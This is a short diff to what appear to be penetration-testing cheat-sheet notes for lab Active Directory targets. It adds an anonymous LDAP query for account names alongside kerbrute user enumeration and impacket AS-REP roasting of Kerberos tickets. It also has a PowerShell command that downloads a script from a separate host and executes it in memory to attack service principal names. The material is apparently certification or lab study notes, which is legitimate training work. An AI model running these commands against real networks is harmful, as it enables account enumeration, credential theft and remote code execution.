@@ -4,6 +4,8 @@ kerbrute userenum [USERFILE] --dc [IP] -d [Domain.com]
 #Enum user and their TGTs
 impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/
 
+#Search user on ldpa
+ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
 
 #Attacking the SPN:
     0. powershell IEX(New-Object Net.Webclient).DownloadString("http://192.168.49.170/GetUserSPNs.ps1")
